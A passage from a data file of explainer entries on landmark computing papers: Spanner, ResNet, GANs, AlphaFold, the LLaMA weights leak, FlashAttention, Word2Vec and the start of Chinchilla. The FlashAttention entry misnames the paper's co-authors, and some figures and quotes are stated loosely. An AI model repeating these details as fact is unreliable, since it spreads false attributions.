"TrueTime.now() → [earliest, latest]\n\nThe actual time is guaranteed to be within the interval.\nTypical uncertainty: about 1-7 milliseconds.\n\nCommit protocol:\n  1. Assign timestamp to transaction\n  2. Wait until TrueTime guarantees the timestamp\n     is in the past: wait for 'latest' to pass\n  3. Only then make the transaction visible\n\nThis wait (called 'commit-wait') is the price of\nexternal consistency. Smaller uncertainty = faster commits." } },
  { n: "This is the key insight: Spanner converts a distributed systems problem (ordering events without a global clock) into an engineering problem (making clocks accurate enough). The tighter the clock uncertainty, the shorter the commit-wait, the lower the latency. Google invested in custom atomic clock hardware specifically to make uncertainty small enough for this to be practical.",
    nt: "Clocks as infrastructure" },

  { h: "What external consistency means" },
  { l: [
   "If transaction T1 commits before transaction T2 starts (in real time, anywhere in the world), then T1 is ordered before T2 in the database.",
   "This is stronger than serialisability: it respects real-time ordering, not just some valid serial ordering.",
   "For the user: if you write data in the US and then read it in Asia, you see your write. Always. Not eventually — immediately."
  ] },

  { h: "What it changed" },
  { l: [
   "CockroachDB, YugabyteDB and TiDB are open-source databases inspired by Spanner's design, using software-based clock synchronisation (NTP/hybrid logical clocks) instead of atomic clocks.",
   "The paper reopened the CAP conversation: with enough clock infrastructure, the practical tradeoff between consistency and latency is more favourable than previously assumed.",
   "Cloud Spanner is available as a managed Google Cloud service, making the technology accessible outside Google.",
   "It demonstrated that hardware investment (custom clocks) can solve software problems (ordering) — an engineering approach that is unusual but effective."
  ] }
 ],
 k: [
  "External consistency at global scale is achievable if you solve the clock synchronisation problem with hardware.",
  "TrueTime returns an uncertainty interval, not a point — and commits wait out the uncertainty to guarantee ordering.",
  "The CAP tradeoff is practical, not absolute: better clocks reduce the consistency-latency tradeoff.",
  "Sometimes the right solution to a software problem is better hardware."
 ],
 r: ["Distributed System", "CAP Theorem", "ACID", "Consensus", "Replication", "Sharding", "Latency"],
 src: [
  { t: "Corbett et al. — Spanner: Google's Globally-Distributed Database (OSDI 2012)", u: "https://research.google/pubs/pub39966/" },
  { t: "Google Cloud — Cloud Spanner documentation", u: "https://cloud.google.com/spanner/docs" }
 ]
},

{
 t: "ResNet: Deep Residual Learning",
 s: "Skip connections solved the depth problem",
 y: 2015, when: "December 2015",
 g: ["deep learning", "computer vision", "skip connections", "imagenet"],
 tldr: "Deeper neural networks should be at least as good as shallower ones — a deeper network can always learn to copy the shallower one's weights and set the extra layers to identity. In practice, they degraded. Kaiming He and colleagues at Microsoft Research solved this by adding shortcut connections that let layers learn residual functions — the difference from identity — instead of the full transformation. ResNet trained networks with 152 layers, won ImageNet 2015 with 3.57% top-5 error (surpassing human performance on the benchmark), and the skip connection became the standard building block of deep learning.",
 say: [
  "The degradation problem: making a network deeper made it worse, even on training data. This was not overfitting — it was an optimisation failure.",
  "The fix was simple: add a shortcut connection from the input of a block to its output, so the layers learn the residual F(x) instead of the full mapping H(x) = F(x) + x.",
  "If the optimal transformation is close to identity, learning a small residual is easier than learning the full function from scratch.",
  "ResNet-152 achieved 3.57% top-5 error on ImageNet — better than typical human performance on the task."
 ],
 b: [
  { h: "The degradation problem" },
  { p: "By 2015, the trend was clear: deeper networks performed better. VGGNet (19 layers) beat AlexNet (8 layers). But past a certain depth, adding more layers made performance worse — not on the test set (which would indicate overfitting) but on the training set. The network could not learn the mapping." },
  { p: "This was surprising. A 56-layer network should be at least as good as a 20-layer one: the extra 36 layers could learn identity mappings and reproduce the 20-layer network's performance. In practice, they could not, because optimising a deep stack of nonlinear layers toward identity is difficult." },

  { h: "The residual block" },
  { p: "The solution was to explicitly make identity the default. Instead of asking a block to learn the mapping H(x), reroute the input around the block via a shortcut connection and ask the block to learn only the residual F(x) = H(x) − x." },
  { x: { lang: "text", code:
"Standard block:          Residual block:\n\n  x                        x ─────────────┐\n  │                        │               │\n  ▼                        ▼               │\n┌──────┐                ┌──────┐           │\n│ Conv │                │ Conv │           │\n│ BN   │                │ BN   │           │\n│ ReLU │                │ ReLU │           │\n│ Conv │                │ Conv │           │\n│ BN   │                │ BN   │           │\n└──────┘                └──┬───┘           │\n  │                        │               │\n  ▼                        ▼               │\n  H(x)                    F(x)  +  ◄──────┘\n                           │        (shortcut)\n                           ▼\n                        H(x) = F(x) + x" } },
  { l: [
   "If the optimal function is close to identity, F(x) is close to zero — which is easy for gradient descent to learn.",
   "The shortcut provides a direct gradient path from loss to early layers, alleviating the vanishing gradient problem.",
   "The shortcut adds no parameters and negligible computation — it is literally an addition.",
   "Blocks can be stacked to arbitrary depth because each block refines the representation rather than transforming it from scratch."
  ] },
  { n: "The skip connection is now ubiquitous. Transformers use residual connections around every attention and feed-forward block. U-Net uses them in medical imaging. DenseNet extends the idea to connect every layer to every other layer. The principle — make identity easy and let the network learn departures from it — is the most reusable architectural idea in modern deep learning.",
    nt: "It is everywhere now" },

  { h: "The results" },
  { tl: [
    { t: "Dec 2015", d: "ResNet paper submitted to CVPR. ResNet-152 achieves 3.57% top-5 error on ImageNet." },
    { t: "2015", d: "Wins ImageNet classification, detection and localisation, plus COCO detection and segmentation." },
    { t: "2016", d: "Becomes the default backbone for object detection (Faster R-CNN) and segmentation networks." },
    { t: "2017+", d: "Residual connections are adopted in transformers, generative models, reinforcement learning and essentially all deep architectures." }
  ] },
  { p: "The paper has over 200,000 citations. Kaiming He's initialisation scheme (He initialisation) is the other contribution from this line of work, and it is the default weight initialisation in most frameworks." }
 ],
 k: [
  "The degradation problem was not overfitting — it was an optimisation failure where deeper networks could not learn identity mappings.",
  "Skip connections make identity the default, so layers learn the residual — a small correction is easier to optimise than the full mapping.",
  "Direct gradient paths through shortcuts alleviate vanishing gradients and enable training hundreds of layers.",
  "The residual connection is the most reused architectural idea in deep learning — it appears in every major architecture since."
 ],
 r: ["Convolutional Neural Network", "Gradient Descent", "Backpropagation", "Batch Normalisation", "Transfer Learning", "ImageNet", "Overfitting"],
 src: [
  { t: "He et al. — Deep Residual Learning for Image Recognition (CVPR 2016)", u: "https://arxiv.org/abs/1512.03385" }
 ]
},

{
 t: "GANs: Generative Adversarial Networks",
 s: "Two networks, one competition, and fake data that looks real",
 y: 2014, when: "June 2014",
 g: ["generative model", "game theory", "adversarial", "deep learning"],
 tldr: "Ian Goodfellow proposed training two neural networks against each other: a generator that creates fake data and a discriminator that tries to tell real from fake. As the discriminator gets better at detecting fakes, the generator gets better at producing them. At equilibrium, the generator produces data indistinguishable from the real distribution. The idea was conceived during a discussion at a bar, implemented that night, and worked on the first try. It opened the era of high-quality generative models.",
 say: [
  "The generator makes fake data, the discriminator classifies real versus fake. They train simultaneously in a minimax game.",
  "At Nash equilibrium, the generator produces data from the true distribution and the discriminator cannot do better than chance.",
  "Goodfellow came up with the idea at a bar, went home, coded it, and it worked on the first run — possibly the best ROI on a night out in CS history.",
  "GANs made realistic image generation possible years before diffusion models — but they are notoriously hard to train (mode collapse, training instability)."
 ],
 b: [
  { h: "The idea" },
  { p: "Previous generative models (variational autoencoders, restricted Boltzmann machines) required explicit density estimation or approximate inference. Goodfellow's insight was that you could train a generative model without ever computing the density, by framing generation as a game." },
  { l: [
   "**Generator G** takes random noise z as input and produces a fake sample G(z).",
   "**Discriminator D** takes a sample (real or fake) and outputs the probability it is real.",
   "G tries to maximise D's error. D tries to minimise it. This is a minimax game."
  ] },
  { x: { lang: "text", code:
"min_G max_D V(D,G) = E[log D(x)] + E[log(1 - D(G(z)))]\n\n          Real data x          Noise z\n              │                    │\n              ▼                    ▼\n        ┌─────────┐          ┌─────────┐\n        │  Real   │          │Generator│\n        │ samples │          │    G    │\n        └────┬────┘          └────┬────┘\n             │                    │\n             ▼                    ▼\n        ┌────────────────────────────┐\n        │      Discriminator D      │\n        │   Real (1.0) or Fake (0)  │\n        └────────────────────────────┘\n\nD learns to distinguish → G learns to fool D\nAt equilibrium: D(G(z)) = 0.5 for all z" } },

  { h: "Why it was hard to train" },
  { p: "The minimax game is elegant in theory and unstable in practice." },
  { l: [
   "**Mode collapse.** The generator learns to produce only a few outputs that consistently fool the discriminator, ignoring the rest of the data distribution. The generated images may be realistic but not diverse.",
   "**Training instability.** If D gets too strong, G gets no useful gradient. If G gets too strong, D cannot learn. Balancing them requires careful hyperparameter tuning.",
   "**No convergence guarantee.** Unlike supervised learning with a clear loss to minimise, GAN training is a game. There is no guarantee of convergence to Nash equilibrium with gradient descent.",
   "**Evaluation is hard.** There is no single metric for 'how good are the generated samples'. FID (Fréchet Inception Distance) and IS (Inception Score) are proxies with known limitations."
  ] },
  { n: "The difficulty of training GANs drove an enormous amount of research: DCGAN established architectural best practices, WGAN introduced the Wasserstein distance for more stable gradients, Progressive GAN grew images from low to high resolution, and StyleGAN achieved photorealistic face generation. Each was a fix for a specific training pathology.",
    nt: "The research it spawned" },

  { h: "What it enabled" },
  { tl: [
    { t: "2014", d: "Original GAN paper. Generates blurry MNIST digits." },
    { t: "2016", d: "DCGAN establishes convolutional GAN architecture. Generates plausible bedroom images." },
    { t: "2017", d: "Pix2pix and CycleGAN demonstrate image-to-image translation (horse↔zebra, satellite→map)." },
    { t: "2018–2020", d: "StyleGAN generates photorealistic human faces. 'This person does not exist' goes viral." },
    { t: "2020+", d: "Diffusion models (DALL-E 2, Stable Diffusion) largely replace GANs for image generation, though GANs remain used for specific applications." }
  ] },
  { p: "GANs demonstrated that adversarial training could produce generative models of startling quality, and the adversarial principle — training against an opponent — now appears in domain adaptation, data augmentation, robustness testing and reinforcement learning." }
 ],
 k: [
  "Adversarial training frames generation as a game: the generator improves by fooling the discriminator.",
  "Mode collapse and training instability are fundamental challenges of minimax optimisation with neural networks.",
  "GANs avoid explicit density estimation — the generator learns to match the data distribution implicitly.",
  "The adversarial principle extends beyond generation: domain adaptation, robustness and data augmentation all use it."
 ],
 r: ["Neural Network", "Gradient Descent", "Backpropagation", "Loss Function", "Overfitting", "Transfer Learning"],
 src: [
  { t: "Goodfellow et al. — Generative Adversarial Nets (NeurIPS 2014)", u: "https://arxiv.org/abs/1406.2661" },
  { t: "Karras et al. — A Style-Based Generator Architecture for Generative Adversarial Networks (StyleGAN, 2019)", u: "https://arxiv.org/abs/1812.04948" }
 ]
},

{
 t: "AlphaFold",
 s: "Biology's 50-year challenge solved by deep learning",
 y: 2020, when: "November 2020",
 g: ["deep learning", "protein folding", "bioinformatics", "evoformer", "attention", "structural biology"],
 tldr: "For five decades, determining how a sequence of amino acids folds into its functional 3D protein structure was an intractable biological puzzle requiring years of lab crystallography per protein. DeepMind's AlphaFold 2 achieved sub-angstrom atomic accuracy at CASP14, predicted the structures of nearly all ~200 million known proteins in public databases, and earned Demis Hassabis and John Jumper the 2024 Nobel Prize in Chemistry.",
 say: [
  "AlphaFold replaced hand-crafted energy physics simulations with end-to-end spatial attention and Evoformers.",
  "It solved the 50-year protein folding challenge, generating 200M+ accurate 3D structures in years instead of millennia of lab experiments.",
  "It earned the 2024 Nobel Prize in Chemistry, proving deep learning can achieve transformative scientific breakthroughs.",
  "AlphaFold 3 expanded prediction from single proteins to complex DNA, RNA, ligands, and multi-molecular complexes."
 ],
 b: [
  { h: "The 50-year grand challenge" },
  { p: "In 1972, Christian Anfinsen accepted the Nobel Prize in Chemistry with a legendary hypothesis: a protein's 3D structure is completely determined by its 1D sequence of amino acids. For fifty years, biology tried and failed to predict this computationally." },
  { p: "Experimental methods like X-ray crystallography and Cryo-EM required months to years of painstaking wet-lab work and hundreds of thousands of dollars per structure. By 2020, humanity had mapped ~170,000 protein structures out of hundreds of millions found in nature. The remaining 99.9% remained dark matter." },

  { h: "The CASP14 shockwave" },
  { p: "Every two years, the Critical Assessment of Structure Prediction (CASP) competition evaluated computational folding on newly sequenced proteins whose structures had been solved experimentally but kept secret." },
  { l: [
   "A Global Distance Test (GDT) score of **90+** is considered competitive with experimental laboratory methods (sub-angstrom atomic error).",
   "For decades, the best computational models plateaued around a GDT of **30–40** for difficult targets.",
   "In November 2020, **AlphaFold 2 reached a median GDT score of 92.4** across all targets, with an average root-mean-square deviation (RMSD) under 1.6Å — matching experimental X-ray crystallography."
  ] },
  { n: "When the CASP14 results were announced, Andrei Lupas, an evolutionary biologist who had worked on an unsolved protein for a decade, stated: 'AlphaFold gave us the model in thirty minutes. It took us ten years to crystallize it.' The organisers declared the protein folding problem effectively solved.",
    nt: "The reaction from the structural biology community" },

  { h: "The architecture: Evoformer & Invariant Point Attention" },
  { p: "AlphaFold 1 (2018) had predicted 2D distance maps between amino acids and passed them to a physics-based optimizer. AlphaFold 2 scrapped this pipeline and designed an **end-to-end geometric deep learning system** with two core innovations:" },
  { l: [
   "**Multiple Sequence Alignment (MSA) & Pair Representation.** Evolution is the ultimate data generator. If two amino acids mutate together across millions of years in different organisms, they are likely in physical contact in the folded 3D shape. The **Evoformer** passes evolutionary and spatial representations back and forth through specialized attention layers.",
   "**Invariant Point Attention (IPA).** The structural module directly outputs 3D atomic coordinates (rotations and translations for each residue backbone) using SE(3)-equivariant geometric attention, preserving rotational and translational symmetries in 3D Euclidean space."
  ] },
  { x: { lang: "text", code:
"Amino Acid Sequence: [M, K, V, L, W, ...]\n        │\n        ▼\n┌────────────────────────┐       ┌────────────────────────┐\n│  MSA Evolution Matrix  │◄─────►│ Pair Spatial Distances │\n└───────────┬────────────┘       └───────────┬────────────┘\n            │                                │\n            └───────────────┬────────────────┘\n                            ▼\n                 ┌────────────────────┐\n                 │ 48 Evoformer Blocks│ (Iterative 2D-1D Attention)\n                 └──────────┬─────────┘\n                            ▼\n                 ┌────────────────────┐\n                 │ Invariant Point    │ (SE(3) Equivariant Attention)\n                 │ Attention (IPA)    │ Direct 3D Coordinate Output\n                 └──────────┬─────────┘\n                            ▼\n          Atomic 3D Protein Structure (PDB/mmCIF)" } },

  { h: "Global impact" },
  { p: "In 2021, DeepMind partnered with the European Bioinformatics Institute (EMBL-EBI) to release the **AlphaFold Protein Structure Database**, making over **200 million protein structures** — virtually every known protein across plants, animals, and bacteria — freely available to global researchers." },
  { l: [
   "Accelerated drug discovery for neglected tropical diseases, malaria, and cancer therapeutics.",
   "Enabled custom enzyme design for plastic recycling and carbon capture.",
   "Demis Hassabis and John Jumper were awarded the **2024 Nobel Prize in Chemistry** for protein structure prediction, cementing deep learning as a foundational tool for fundamental science."
  ] }
 ],
 k: [
  "AlphaFold 2 solved the 50-year protein folding grand challenge by achieving atomic accuracy (GDT > 90).",
  "The Evoformer treats evolutionary co-mutation matrices and pairwise spatial distances as coupled attention channels.",
  "Invariant Point Attention (IPA) directly reasons over 3D rigid-body spatial transformations with SE(3) equivariance.",
  "The release of 200M+ structures democratized structural biology, culminating in the 2024 Nobel Prize in Chemistry."
 ],
 r: ["Deep Learning", "Neural Network", "Attention Mechanism", "Transformer", "Loss Function", "Gradient Descent", "Computer Vision"],
 src: [
  { t: "Jumper et al. — Highly accurate protein structure prediction with AlphaFold (Nature 2021)", u: "https://www.nature.com/articles/s41586-021-03819-2" },
  { t: "AlphaFold Protein Structure Database (EMBL-EBI)", u: "https://alphafold.ebi.ac.uk/" }
 ]
},

{
 t: "The LLaMA Leak & Open-Weights Revolution",
 s: "The 4-bit torrent that democratised frontier AI",
 y: 2023, when: "March 2023",
 g: ["llm", "open source", "llama", "quantisation", "lora", "community"],
 tldr: "When Meta's research weights for LLaMA-65B were leaked via a BitTorrent magnet link on 4chan in March 2023, it triggered the most intense open-source engineering frenzy in computer science history. Within weeks, developers created llama.cpp to run 65B models on MacBooks, 4-bit quantization (GPTQ/AWQ), and $500 LoRA fine-tunes (Alpaca, Vicuna), proving the open-source community could rival billion-dollar proprietary APIs.",
 say: [
  "The LLaMA leak proved consumer hardware could run frontier LLMs via 4-bit integer quantisation and pure C++.",
  "It birthed the modern open-weights ecosystem: llama.cpp, Ollama, vLLM, Hugging Face, Mistral, and Llama 3.",
  "Georgi Gerganov wrote llama.cpp in plain C++ with zero dependencies, running 13B models locally on M1 Apple Silicon at interactive speeds.",
  "The leaked Google internal memo 'We Have No Moat, And Neither Does OpenAI' captured the panic as open models caught up in weeks."
 ],
 b: [
  { h: "The leak" },
  { p: "In February 2023, Meta AI published the LLaMA paper and shared weights with approved academic researchers. On March 3, 2023, an approved user posted a BitTorrent magnet link to the entire weight archive on 4chan and submitted a pull request directly to Meta's GitHub repository." },
  { p: "Unlike previous research models, LLaMA was trained on 1.4 trillion tokens of public text — clean, efficient, and compute-dense. The weights were out, and they could not be called back." },

  { h: "Ten days that shook the industry" },
  { p: "What followed over the next three weeks was an unprecedented explosion of distributed open-source optimization:" },
  { l: [
   "**March 10 — llama.cpp is born.** Bulgarian engineer Georgi Gerganov rewrote the entire LLaMA inference engine in raw C/C++ with zero dependencies. Within 48 hours, a 13B model was executing in real-time on an Apple M1 MacBook with no GPU required.",
   "**March 13 — Stanford Alpaca ($500 fine-tuning).** Researchers at Stanford used GPT-3.5 to generate 52,000 instruction pairs, fine-tuning LLaMA-7B for under $500 using LoRA (Low-Rank Adaptation).",
   "**March 19 — 4-bit integer quantization (GPTQ/GGML).** Quantization reduced memory requirements from 16-bit floats (130GB for 65B) down to 4-bit integers (35GB), allowing 65B frontier intelligence to run on a single consumer RTX 3090 GPU or MacBook Pro."
  ] },
  { x: { lang: "text", code:
"Original FP16 Model (65B):    65 Billion × 2 Bytes  = 130 GB VRAM (Requires 2× A100 $20,000)\n                                        │\n                       4-Bit Quantization (GPTQ / GGUF)\n                                        ▼\nQuantized Model (65B Q4_K_M): 65 Billion × 0.5 Bytes =  35 GB VRAM (Runs on 1× RTX 3090 / M1 Mac)" } },

  { n: "In May 2023, an internal Google memo leaked titled 'We Have No Moat, And Neither Does OpenAI': 'While we've been squabbling, a third faction has been quietly eating our lunch... Open source models are faster, more customizable, more private, and pound-for-pound more capable. They are doing things with $100 and 13B params that we struggle with at $10M and 540B.'",
    nt: "The 'We Have No Moat' realization" },

  { h: "What it built" },
  { p: "The momentum from the March 2023 leak permanently restructured the AI industry:" },
  { l: [
   "**Ecosystem tooling:** GGUF file format, Ollama, vLLM, Text Generation WebUI, and Hugging Face became the standard deployment stack.",
   "**Corporate strategy pivot:** Meta fully embraced open-weights by releasing **Llama 2** and **Llama 3** under permissive commercial licenses.",
   "**European & startup champions:** Mistral AI was founded by former Meta/DeepMind researchers, releasing Mistral-7B and Mixtral 8x7B directly as open-weight torrents."
  ] }
 ],
 k: [
  "4-bit quantization and C++ SIMD vectorization brought frontier LLM inference to consumer laptops.",
  "Low-Rank Adaptation (LoRA) reduced instruction fine-tuning costs from millions to hundreds of dollars.",
  "The open-source community caught up to proprietary cloud models within months of having access to compute-dense base weights.",
  "Meta transformed an accidental leak into a deliberate open-weights distribution strategy with Llama 2 and 3."
 ],
 r: ["Large Language Model", "Quantisation", "LoRA", "Inference", "Fine-Tuning", "Transformer", "Context Window"],
 src: [
  { t: "Touvron et al. — LLaMA: Open and Efficient Foundation Language Models (Meta AI 2023)", u: "https://arxiv.org/abs/2302.13971" },
  { t: "Georgi Gerganov — llama.cpp (GitHub)", u: "https://github.com/ggerganov/llama.cpp" }
 ]
},

{
 t: "FlashAttention",
 s: "The hardware-aware IO trick that unlocked long context",
 y: 2022, when: "May 2022",
 g: ["gpu", "attention", "transformer", "cuda", "memory hierarchy", "kernel"],
 tldr: "Standard Transformer attention required materializing the entire N×N attention matrix in slow GPU High Bandwidth Memory (HBM), creating an O(N²) memory wall that capped context windows at 2K–4K tokens. Tri Dao and Christopher Ré introduced FlashAttention — an exact, non-approximated attention algorithm that tiles the computation to keep data in fast on-chip SRAM using online softmax. It made training 3–4× faster and paved the way for 100K to 1M+ token context windows.",
 say: [
  "Attention wasn't compute-bound on modern GPUs; it was memory-bandwidth bound between HBM and SRAM.",
  "FlashAttention computes exact self-attention without ever writing the N×N intermediate matrix to global memory.",
  "It uses tiling and the online softmax trick to incrementally compute row-wise maxima and normalizers on fast on-chip SRAM.",
  "Every modern frontier LLM (GPT-4, Claude, Gemini, Llama 3) uses FlashAttention or its derivatives to train on long contexts."
 ],
 b: [
  { h: "The memory wall in Transformer attention" },
  { p: "Self-attention computes $O = \\text{softmax}(QK^T / \\sqrt{d}) V$. For a sequence of length $N$, the intermediate matrix $S = QK^T$ has size $N \\times N$." },
  { p: "On modern GPUs like the NVIDIA A100, tensor cores provide massive compute (312 TFLOPs), but global High Bandwidth Memory (HBM) is relatively slow (1.5–2.0 TB/s). In contrast, on-chip **SRAM** (192 KB per streaming multiprocessor) is 10× faster (~19 TB/s) but tiny." },
  { l: [
   "Standard PyTorch attention computed $QK^T$, wrote the $N \\times N$ matrix to slow HBM, read it back to compute Softmax, wrote it to HBM again, and read it back to multiply by $V$.",
   "For $N = 2,048$, $N \\times N$ is manageable. For $N = 64,000$ or $128,000$, the $N \\times N$ matrix occupies hundreds of gigabytes of VRAM, running out of memory before computation even begins.",
   "Attention was bottlenecked by **memory IO reads and writes**, not mathematical FLOPs."
  ] },

  { h: "The innovation: Tiling & Online Softmax" },
  { p: "Tri Dao, Daniel Haziza, Francisco Massa, and Christopher Ré designed FlashAttention around two core ideas:" },
  { l: [
   "**Tiling.** Split $Q, K, V$ into small blocks that fit entirely inside GPU SRAM (e.g. $64 \\times 64$).",
   "**Online Softmax.** The softmax function requires knowing the maximum value and denominator sum of the entire row: $m = \\max(x)$ and $d = \\sum e^{x_i - m}$. Traditionally, you cannot compute softmax on a block without seeing the whole sequence. Online softmax incrementally updates the scaling factor and running sum as new blocks are loaded, mathematically yielding the exact same output without ever storing the full $N \\times N$ matrix."
  ] },
  { x: { lang: "text", code:
"Standard Attention (Memory IO Bound):    FlashAttention (Hardware-Aware SRAM Tiling):\n\n     GPU SRAM (19 TB/s)                       GPU SRAM (19 TB/s)\n┌────────────────────────────┐           ┌────────────────────────────┐\n│ Q, K, V Blocks             │           │ Load Q_i, K_j, V_j Block   │\n└─────────────┬──────────────┘           │ Compute Partial Softmax    │\n              │ Write N×N matrix         │ Update Running Stats (m, d)│\n              ▼                          └─────────────┬──────────────┘\n     GPU HBM (1.5 TB/s)                                │ Write ONLY final Output O_i\n┌────────────────────────────┐                         ▼\n│ Huge N×N Attention Matrix  │                GPU HBM (1.5 TB/s)\n│ Memory: O(N²) Slow IO Bottleneck       ┌────────────────────────────┐\n└────────────────────────────┘           │ Final Output O: O(N) Mem   │\n                                         └────────────────────────────┘" } },

  { h: "Backward pass recomputation" },
  { p: "In standard backpropagation, the $N \\times N$ attention matrix had to be stored in VRAM during the forward pass so gradients could be calculated during the backward pass." },
  { p: "FlashAttention instead **discards** the intermediate attention scores and recomputes them on-the-fly during the backward pass from $Q, K, V$ blocks stored in SRAM. Recomputing is drastically faster than reading from slow HBM, reducing memory footprint from $O(N^2)$ to $O(N)$." },

  { h: "The impact on modern AI" },
  { p: "FlashAttention (and subsequent FlashAttention-2 and FlashAttention-3 for Hopper H100s) made exact attention 2–4× faster and enabled:" },
  { l: [
   "**100K to 1M+ token context windows** in models like Gemini 1.5, Llama 3.1, and Claude 3.",
   "Standard inclusion in PyTorch (`scaled_dot_product_attention`), vLLM, TensorRT-LLM, and Hugging Face Transformers.",
   "Proof that **hardware-aware algorithm design** yields greater speedups than naive brute-force scaling."
  ] }
 ],
 k: [
  "Standard attention was memory-bandwidth bound by reading/writing the N×N intermediate matrix to GPU HBM.",
  "FlashAttention uses SRAM tiling and online softmax to compute exact attention without storing the N×N matrix.",
  "Recomputing attention blocks during the backward pass is faster than storing and reading them from global memory.",
  "FlashAttention unlocked long-context LLMs, scaling sequence lengths from 2K tokens to 1M+ tokens."
 ],
 r: ["Attention Mechanism", "Transformer", "GPU", "CUDA", "Context Window", "Kernel", "Latency"],
 src: [
  { t: "Dao et al. — FlashAttention: Fast and Memory-Efficient Exact Attention with IO-Awareness (NeurIPS 2022)", u: "https://arxiv.org/abs/2205.14135" },
  { t: "Dao — FlashAttention-2: Faster Attention with Better Parallelism and Work Partitioning (2023)", u: "https://arxiv.org/abs/2307.08691" }
 ]
},

{
 t: "Word2Vec",
 s: "When vector arithmetic captured human meaning",
 y: 2013, when: "January 2013",
 g: ["nlp", "embeddings", "neural network", "semantics", "representation"],
 tldr: "Tomas Mikolov and his Google team showed that simple 2-layer neural networks (Continuous Bag of Words and Skip-gram) trained on raw unlabelled text learned dense continuous vector spaces where geometric relationships mirrored human semantic relationships. The famous demonstration that vector('King') - vector('Man') + vector('Woman') ≈ vector('Queen') marked the permanent transition from symbolic n-grams to dense learned representations.",
 say: [
  "Word2Vec proved that simple neural models trained on unlabeled text discover dense semantic representations.",
  "Vector arithmetic preserves analogies: King - Man + Woman = Queen, Paris - France + Italy = Rome.",
  "Skip-gram with Negative Sampling transformed a computationally impossible softmax over millions of words into simple binary logistic regressions.",
  "It established the embedding paradigm that underpins modern search, recommendation systems, and all Transformer LLMs."
 ],
 b: [
  { h: "Before: Sparse one-hot vectors" },
  { p: "In 2012, Natural Language Processing treated words as discrete, atomic symbols. In a vocabulary of 50,000 words, 'cat' was a 50,000-dimensional one-hot vector with a 1 at index 42 and 0s everywhere else. 'Dog' was a vector with a 1 at index 89." },
  { p: "The dot product between any two distinct one-hot vectors is always 0. To the computer, 'cat' was as mathematically distant from 'feline' and 'dog' as it was from 'refrigerator' or 'algebra'. Models had no concept of semantic similarity." },

  { h: "The distributional hypothesis in neural weights" },
  { p: "Linguist J.R. Firth famously wrote in 1957: *'You shall know a word by the company it keeps.'* Tomas Mikolov, Kai Chen, Greg Corrado, and Jeffrey Dean at Google operationalized this with two lightweight neural architectures:" },
  { l: [
   "**Continuous Bag of Words (CBOW):** Predict the target word given its surrounding context words (e.g. given 'the cat sits on the [?]', predict 'mat').",
   "**Skip-gram:** Predict the surrounding context words given a single target word (e.g. given 'cat', predict 'the', 'sits', 'purrs')."
  ] },

  { h: "The algorithmic leap: Negative Sampling" },
  { p: "A standard neural network output layer computing a softmax over a vocabulary of 1,000,000 words requires calculating a denominator with one million exponential terms for every single training word — computationally impossible on large corpora." },
  { p: "Mikolov introduced **Skip-gram with Negative Sampling (SGNS)**: instead of predicting the exact word across the whole vocabulary, turn it into a binary classification problem: *'Did this target word and context word appear together in the text (positive sample), or did we randomly pull this context word from a dictionary (negative sample)?'* This reduced training complexity from $O(|V|)$ to $O(k)$ where $k \\approx 5–20$." },
  { x: { lang: "text", code:
"                     Vector Subtraction & Addition in Embedding Space\n\n     Gender Direction ──►\n  ┌────────────────────────────────────────────────────────┐\n  │                                                        │\n  │    vec(\"King\") ───────────────► vec(\"Queen\")          │\n  │         │                            │                 │\n  │         │ Royalty                    │ Royalty         │\n  │         ▼                            ▼                 │\n  │    vec(\"Man\")  ───────────────► vec(\"Woman\")          │\n  │                                                        │\n  └────────────────────────────────────────────────────────┘\n\n  vec(\"King\") - vec(\"Man\") + vec(\"Woman\") ≈ vec(\"Queen\")\n  vec(\"Paris\") - vec(\"France\") + vec(\"Italy\") ≈ vec(\"Rome\")" } },

  { h: "Linear semantic geometry" },
  { p: "When the learned 300-dimensional vectors were examined, researchers discovered an astonishing emergent property: linear directions in the vector space corresponded to abstract semantic concepts." },
  { l: [
   "**Capital cities:** $\\vec{v}(\\text{Madrid}) - \\vec{v}(\\text{Spain}) + \\vec{v}(\\text{France}) \\approx \\vec{v}(\\text{Paris})$",
   "**Comparative adjectives:** $\\vec{v}(\\text{bigger}) - \\vec{v}(\\text{big}) + \\vec{v}(\\text{small}) \\approx \\vec{v}(\\text{smaller})$",
   "**Verb tenses:** $\\vec{v}(\\text{walking}) - \\vec{v}(\\text{walk}) + \\vec{v}(\\text{swim}) \\approx \\vec{v}(\\text{swimming})$"
  ] },

  { h: "The lineage" },
  { p: "Word2Vec proved that neural networks could distill unstructured human text into dense geometric representations without human supervision. It paved the way for GloVe (2014), FastText (2016), ELMo (2018), and ultimately the embedding layers that initiate every modern Transformer LLM." }
 ],
 k: [
  "Word2Vec replaced orthogonal one-hot vectors with dense 300D continuous semantic embeddings.",
  "Skip-gram with Negative Sampling turned multi-class vocabulary prediction into fast binary logistic regressions.",
  "Linear vector arithmetic in embedding space captures human analogies: King - Man + Woman = Queen.",
  "It established self-supervised pre-training on raw unlabelled text as the dominant NLP paradigm."
 ],
 r: ["Embedding", "Natural Language Processing", "Vector Database", "Cosine Similarity", "Neural Network", "Softmax", "Loss Function"],
 src: [
  { t: "Mikolov et al. — Efficient Estimation of Word Representations in Vector Space (ICLR 2013)", u: "https://arxiv.org/abs/1301.3781" },
  { t: "Mikolov et al. — Distributed Representations of Words and Phrases and their Compositionality (NeurIPS 2013)", u: "https://arxiv.org/abs/1310.4546" }
 ]
},

{
 t: "Chinchilla & Modern LLM Scaling Laws",
 s: "Why everyone was training the wrong models",
 y: 2022, when: "March 2022",
 g: ["llm", "scaling laws", "chinchilla", "training", "compute", "deepmind"],
 tldr: "OpenAI's 2020 Kaplan scaling laws suggested that parameter count was the dominant factor in model performance, leading the industry to train colossal, undertrained models like GPT-3 (175B on 300B tokens) and Gopher (280B on 300B tokens). DeepMind's Chinchilla paper (Hoffmann et al.) proved this was severely suboptimal: compute-optimal training requires scaling model parameters and training dataset tokens in a 1:1 ratio. A 70B Chinchilla model trained on 1.4T tokens outperformed 280B Gopher while being 4× cheaper to run.",
 say: [
  "Kaplan 2020 over-emphasized parameter count; Hoffmann 2022 showed tokens and parameters must scale equally.",
  "For compute-optimal training, a 70B parameter model requires ~1.4 trillion tokens, not 300 billion.",
  "Smaller, overtrained models are dramatically cheaper to serve in production (inference cost scales with parameters, not training tokens).",
  "Chinchilla reset the entire LLM training playbook — directly leading to LLaMA (7B/13B trained on 1T+ tokens) and modern efficient architectures."
 ],
 b: [
  { h: "The Kaplan era: Bigger is better" },
